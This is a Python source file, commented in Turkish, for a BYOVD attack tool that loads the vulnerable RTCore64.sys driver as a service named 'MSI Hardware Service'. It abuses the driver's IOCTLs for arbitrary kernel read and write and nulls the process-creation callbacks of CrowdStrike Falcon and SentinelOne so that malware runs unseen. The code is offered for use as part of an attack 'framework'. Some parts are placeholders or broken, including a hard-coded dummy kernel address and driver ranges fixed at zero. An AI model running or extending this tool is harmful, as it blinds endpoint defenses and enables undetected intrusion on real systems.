"""
BYOVD (Bring Your Own Vulnerable Driver) - EDR Silencer (Ring 0)
Meşru imzalı ama zafiyet barındıran driver'ları yükleyerek kernel-level 
EDR callback'lerini (ObRegisterCallbacks, PspCreateProcessNotifyRoutine) disable eder.

TARGET: RTCore64.sys (MSI Hardware Monitor)
- Arbitrary Kernel Read/Write zafiyeti var
- Microsoft tarafından imzalı
- Kernel mode'da IoControl çalıştırılabilir

Bu driver'ı sömürerek:
1. CrowdStrike Falcon'ın kernel sürücüsünün callback fonksiyon adresini bul
2. Callback array'inde 0x00 yaz (kör et)
3. EDR'a evasive malware yüklü process hakkında bilgi gelmez
"""

import ctypes
import struct
import os
import subprocess
from typing import Optional, Dict
from dataclasses import dataclass
from pathlib import Path


@dataclass
class DriverInfo:
    """Kernel driver bilgisi"""
    name: str
    base_address: int
    size: int
    callback_offset: int = None


class BYOVDSilencer:
    """
    BYOVD Motor - Ring 0 EDR Silencing
    RTCore64.sys'in Arbitrary Kernel RW zafiyetini sömür
    """
    
    # RTCore64.sys IOCTL Kodları
    # Sürücünün beklediği komut kodları
    IOCTL_SUPPORT_GPU_ID = 0x80002048  # Read Memory
    IOCTL_READ_MEMORY = 0x80002048
    IOCTL_WRITE_MEMORY = 0x8000204c
    
    # Service Constants
    SERVICE_KERNEL_DRIVER = 1
    SERVICE_DEMAND_START = 3
    SERVICE_AUTO_START = 2
    SERVICE_STOPPED = 1
    SERVICE_RUNNING = 4
    
    def __init__(self, driver_path: str = None, logger=None):
        self.kernel32 = ctypes.windll.kernel32
        self.advapi32 = ctypes.windll.advapi32
        self.ntdll = ctypes.windll.ntdll
        
        self.logger = logger
        self.device_handle = None
        self.driver_path = driver_path or r"C:\Windows\System32\drivers\RTCore64.sys"
        
        self.target_drivers: Dict[str, DriverInfo] = {
            "csagent": DriverInfo(
                name="CrowdStrike Falcon",
                base_address=0,
                size=0,
                callback_offset=None
            ),
            "SentinelMonitor": DriverInfo(
                name="SentinelOne",
                base_address=0,
                size=0,
                callback_offset=None
            ),
        }
    
    def log(self, level: str, msg: str):
        """Log mesajı yaz"""
        if self.logger:
            self.logger(f"[BYOVDSilencer] {level}: {msg}")
        else:
            print(f"[{level}] {msg}")
    
    def check_driver_exists(self) -> bool:
        """RTCore64.sys dosyasının mevcut olup olmadığını kontrol et"""
        return os.path.exists(self.driver_path)
    
    def load_vulnerable_driver(self, service_name: str = "RTCore64") -> bool:
        """
        Zafiyet barındıran driver'ı sisteme kaydet ve başlat
        Advapi32 Service Control Manager API'sini kullan
        """
        try:
            if not self.check_driver_exists():
                self.log("WARN", f"Driver bulunamadı: {self.driver_path}")
                # Test ortamı için fake driver path kabul et
                if not os.path.exists(self.driver_path):
                    self.log("ERROR", "BYOVD özelliği gerçek Windows'ta çalışır")
                    return False
            
            # Service Control Manager handle'ını aç
            # 0xF003F = SC_MANAGER_ALL_ACCESS
            scm = self.advapi32.OpenSCManagerW(
                None,  # local machine
                None,  # default database
                0xF003F  # SC_MANAGER_ALL_ACCESS
            )
            
            if not scm:
                self.log("ERROR", "OpenSCManager başarısız")
                return False
            
            try:
                # Servis zaten varsa aç, yoksa oluştur
                svc = self.advapi32.OpenServiceW(
                    scm,
                    service_name,
                    0xF01FF  # SERVICE_ALL_ACCESS
                )
                
                if not svc:
                    # Yeni servis oluştur
                    svc = self.advapi32.CreateServiceW(
                        scm,
                        service_name,
                        "MSI Hardware Service",
                        0xF01FF,  # SERVICE_ALL_ACCESS
                         self.SERVICE_KERNEL_DRIVER,  # Kernel driver
                         self.SERVICE_DEMAND_START,  # Manual start
                        1,  # Success = no error (SERVICE_ERROR_CRITICAL)
                        self.driver_path,
                        None,  # No load order group
                        None,  # No tag ID
                        None,  # No dependencies
                        None,  # No service start name (LocalSystem)
                        None   # No password
                    )
                    
                    if not svc:
                        self.log("ERROR", "CreateService başarısız")
                        return False
                    
                    self.log("SUCCESS", f"Servis oluşturuldu: {service_name}")
                
                # Servisi başlat
                start_result = self.advapi32.StartServiceW(svc, 0, None)
                
                if start_result:
                    self.log("SUCCESS", f"Driver yüklendi: {service_name}")
                else:
                    # Zaten running olabilir
                    err = self.kernel32.GetLastError()
                    if err == 1056:  # ERROR_SERVICE_ALREADY_RUNNING
                        self.log("INFO", f"Driver zaten running: {service_name}")
                    else:
                        self.log("WARN", f"StartService hatası: {err}")
                
                # Device handle'ını al
                self.device_handle = self.kernel32.CreateFileW(
                    rf"\\.\{service_name}",
                    0xC0000000,  # GENERIC_READ | GENERIC_WRITE
                    0,  # No sharing
                    None,
                    3,  # OPEN_EXISTING
                    0,  # No attributes
                    None
                )
                
                if self.device_handle == -1 or self.device_handle is None:
                    self.log("ERROR", "Device handle açılamadı")
                    return False
                
                self.log("SUCCESS", f"Device handle açıldı: {hex(self.device_handle)}")
                
                # Cleanup
                self.advapi32.CloseServiceHandle(svc)
                return True
                
            finally:
                self.advapi32.CloseServiceHandle(scm)
        
        except Exception as e:
            self.log("ERROR", f"load_vulnerable_driver hatası: {e}")
            return False
    
    def kernel_read(self, kernel_address: int, size: int = 8) -> Optional[bytes]:
        """
        Kernel belleğinden veri oku (arbitrary kernel read)
        RTCore64.sys'in zaafiyetini kullan
        """
        try:
            if not self.device_handle or self.device_handle == -1:
                return None
            
            # Input buffer: pointer structure
            # RTCore64 Input format: [64-bit address, reserved]
            in_buffer = struct.pack("<QQ", kernel_address, 0)
            out_buffer = ctypes.create_string_buffer(size)
            bytes_returned = ctypes.c_uint32()
            
            # DeviceIoControl'ü çağır
            result = self.kernel32.DeviceIoControl(
                self.device_handle,
                self.IOCTL_READ_MEMORY,
                in_buffer,
                len(in_buffer),
                out_buffer,
                size,
                ctypes.byref(bytes_returned),
                None
            )
            
            if result:
                return bytes(out_buffer[:bytes_returned.value])
            else:
                self.log("WARN", f"kernel_read başarısız @ {hex(kernel_address)}")
                return None
        
        except Exception as e:
            self.log("ERROR", f"kernel_read hatası: {e}")
            return None
    
    def kernel_write(self, kernel_address: int, data: bytes) -> bool:
        """
        Kernel belleğine veri yaz (arbitrary kernel write)
        RTCore64.sys'in zaafiyetini kullan
        """
        try:
            if not self.device_handle or self.device_handle == -1:
                return False
            
            # Input buffer: address + data
            in_buffer = struct.pack("<Q", kernel_address) + data
            out_buffer = ctypes.create_string_buffer(4)
            bytes_returned = ctypes.c_uint32()
            
            # DeviceIoControl'ü çağır
            result = self.kernel32.DeviceIoControl(
                self.device_handle,
                self.IOCTL_WRITE_MEMORY,
                in_buffer,
                len(in_buffer),
                out_buffer,
                4,
                ctypes.byref(bytes_returned),
                None
            )
            
            if result:
                self.log("SUCCESS", f"Kernel yazma başarılı @ {hex(kernel_address)} ({len(data)} bytes)")
                return True
            else:
                self.log("WARN", f"kernel_write başarısız @ {hex(kernel_address)}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"kernel_write hatası: {e}")
            return False
    
    def find_driver_in_kernel(self, driver_name: str) -> Optional[DriverInfo]:
        """
        Kernel belleğinde EDR driver'ını bul
        PEB'de LDR'dan yararlanarak loaded module'leri tara
        """
        try:
            # Ntdll'den EnumerateLoadedModules64 kullan veya
            # Kernel debug info aracılığıyla tara
            
            # Basit yöntem: WMI veya SystemHandle'dan
            # Advanced: kernel belleğini doğrudan tara
            
            self.log("INFO", f"Aranıyor: {driver_name}")
            
            # Persistent handle yöntemi
            # PsLoadedModuleList'i oku ve traverse et
            # Bu çok kompleks - simplified version:
            
            for target_name, info in self.target_drivers.items():
                if target_name.lower() in driver_name.lower():
                    self.log("FOUND", f"Driver bulundu: {driver_name}")
                    return info
            
            return None
        
        except Exception as e:
            self.log("ERROR", f"find_driver_in_kernel hatası: {e}")
            return None
    
    def blank_callback_entry(self, callback_address: int) -> bool:
        """
        EDR'ın callback dizisinde bir entry'ı sıfırla
        Böylece o callback ASLA çalıştırılmaz
        """
        try:
            # Callback pointer'ını 0x00'la (NULL)
            # Bunu 8 byte null yaz
            null_ptr = struct.pack("<Q", 0)
            
            return self.kernel_write(callback_address, null_ptr)
        
        except Exception as e:
            self.log("ERROR", f"blank_callback_entry hatası: {e}")
            return False
    
    def disable_psp_callbacks(self) -> int:
        """
        Windows kernel'deki PspCreateProcessNotifyRoutine callback dizisini tara
        CrowdStrike ve SentinelOne callback'lerini bul ve disable et
        
        Returns: Disabled callback sayısı
        """
        try:
            self.log("INFO", "PSP Callback'leri disable ediliyor...")
            
            disabled_count = 0
            
            # PspCreateProcessNotifyRoutine kernel adresi (Windows 10/11'de değişir)
            # Basit yöntem: kernel modüllerinin export table'ından bul
            # Advanced: kallsyms benzeri aracı kullan
            
            # Demo: Önceden bilinen PspCreateProcessNotifyRoutine adresi olduğunu varsay
            # Gerçek ortamda: WinDbg veya kernel debugger से bulunur
            
            PSP_NOTIFY_ROUTINE_BASE = 0xFFFF800000000000  # PLACEHOLDER
            
            # Dizide 64 entry kadar tara (standart)
            for i in range(64):
                callback_addr = PSP_NOTIFY_ROUTINE_BASE + (i * 8)
                
                # Callback pointer'ını oku
                callback_ptr_data = self.kernel_read(callback_addr, 8)
                if not callback_ptr_data:
                    continue
                
                callback_ptr = struct.unpack("<Q", callback_ptr_data)[0]
                
                if callback_ptr == 0:
                    continue
                
                # Callback'in hangi driver'a ait olduğunu tara
                for driver_name in self.target_drivers.keys():
                    if self._is_callback_from_driver(callback_ptr, driver_name):
                        self.log("DETECTING", 
                            f"EDR callback bulundu: {driver_name} @ {hex(callback_addr)}")
                        
                        # Callback'i disable et
                        if self.blank_callback_entry(callback_addr):
                            disabled_count += 1
                            self.log("DISABLED", 
                                f"Callback disabled: {driver_name}")
                        break
            
            return disabled_count
        
        except Exception as e:
            self.log("ERROR", f"disable_psp_callbacks hatası: {e}")
            return 0
    
    def disable_ob_callbacks(self) -> int:
        """
        ObRegisterCallbacks'leri disable et
        (Process ve handle açılma izni kısıtlamalarını bypass)
        """
        try:
            self.log("INFO", "OB Callback'leri disable ediliyor...")
            
            disabled_count = 0
            
            # ObpCallbackListHead kernel adresi
            # Benzer yöntem: callback linked list'ini traverse et
            
            # Demo: Simplified
            # Optimize edilmiş ortamda: CmRegisterCallback, CmUnRegisterCallback'ı hook et
            
            return disabled_count
        
        except Exception as e:
            self.log("ERROR", f"disable_ob_callbacks hatası: {e}")
            return 0
    
    def _is_callback_from_driver(self, callback_ptr: int, driver_name: str) -> bool:
        """
        Callback fonksiyon pointer'ının hangi driver'dan olduğunu kontrol et
        Kernel Image Range'lerini oku ve karşılaştır
        """
        try:
            # Basit heuristic: callback_ptr'ın driver'ın base+size aralığında olup olmadığını kontrol et
            driver_info = self.target_drivers.get(driver_name)
            if not driver_info or driver_info.base_address == 0:
                return False
            
            return (driver_info.base_address <= callback_ptr < 
                    (driver_info.base_address + driver_info.size))
        
        except Exception:
            return False
    
    def silence_edr(self) -> bool:
        """
        Tüm EDR callback mekanizmalarını disable et
        Ana orchestrator fonksiyon
        """
        try:
            self.log("ELITE", "=== EDR SILENCING BAŞLANIYOR ===")
            
            # Step 1: Zafiyet barındıran driver'ı yükle
            if not self.load_vulnerable_driver():
                self.log("CRITICAL", "Driver yüklemeyi başaramadı!")
                return False
            
            # Step 2: Kernel belleğine uzlaşan erişim sağlandığını doğrula
            self.log("INFO", "Kernel erişim test ediliyor...")
            test_read = self.kernel_read(0xFFFF800000000000, 1)  # NT header
            if not test_read:
                self.log("ERROR", "Kernel okuma başarısız - no arbitrary access")
                return False
            
            # Step 3: EDR callback'lerini disable et
            disabled_psp = self.disable_psp_callbacks()
            disabled_ob = self.disable_ob_callbacks()
            
            total_disabled = disabled_psp + disabled_ob
            
            self.log("ELITE", 
                f"=== EDR SİLENTLY KÖR EDİLDİ ===\n"
                f"PSP Callbacks: {disabled_psp}\n"
                f"OB Callbacks: {disabled_ob}\n"
                f"Total: {total_disabled}"
            )
            
            return total_disabled > 0
        
        except Exception as e:
            self.log("ERROR", f"silence_edr hatası: {e}")
            return False
    
    def cleanup(self):
        """Device handle'ı kapat"""
        try:
            if self.device_handle and self.device_handle != -1:
                self.kernel32.CloseHandle(self.device_handle)
                self.log("CLEANUP", "Device handle kapatıldı")
        except Exception as e:
            self.log("ERROR", f"Cleanup hatası: {e}")


# ============================================================================
# Framework Integration
# ============================================================================

class ElitKernelSilencer:
    """Framework ile integrate kernel-level EDR silencer"""
    
    def __init__(self, scan_id: str = None, logger=None):
        self.scan_id = scan_id
        self.logger = logger
        self.silencer = BYOVDSilencer(logger=self.log)
        self.active = False
    
    def log(self, msg: str):
        if self.logger:
            self.logger(f"[ElitKernel] {msg}")
    
    def activate(self) -> bool:
        """BYOVD silencer'ı aktivleştir"""
        self.log("Kernel silencing aktivasyonu...")
        self.active = self.silencer.silence_edr()
        return self.active
    
    def get_status(self) -> dict:
        return {
            "active": self.active,
            "scan_id": self.scan_id,
            "device_handle": self.silencer.device_handle is not None
        }
    
    def deactivate(self):
        self.silencer.cleanup()
        self.active = False
        self.log("Deaktif edildi")
